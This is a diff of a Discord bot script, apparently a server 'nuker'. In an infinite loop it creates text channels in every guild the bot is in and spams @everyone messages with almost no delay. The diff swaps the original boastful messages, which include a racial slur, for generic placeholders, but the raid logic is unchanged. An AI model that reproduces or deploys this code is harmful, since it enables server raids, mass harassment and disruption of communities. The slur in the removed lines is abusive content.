@@ -115,14 +115,14 @@ description=allowed_users_mentions, color=0x00ff00)
           # add channels forever called "u got nukd by kuruyami l niglet"
           while True:
               for guild in client.guilds:
-                  channele = await guild.create_text_channel("u got nukd by kuruyami l niglet")
-                  await channele.send("@everyone u got nukd by kuruyami l niglet")
+                  channele = await guild.create_text_channel("spam_channel_name")
+                  await channele.send("@everyone spam_message")
                   await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
-                  await channele.send("Mr.Bobby is the goat :goat: :on: :top:")
+                  await channele.send("spam_message")
                   await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
-                  await channele.send("InterKen is the goat :goat: :on: :top:")
+                  await channele.send("spam_message")
                   await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
-                  await channele.send("Kuruyami on top :cold_face: :cold_sweat:")
+                  await channele.send("spam_message")
                   await asyncio.sleep(.0001)  # Add a delay here to avoid rate-limiting
 
 client.run('YOUR_BOT_TOKEN')
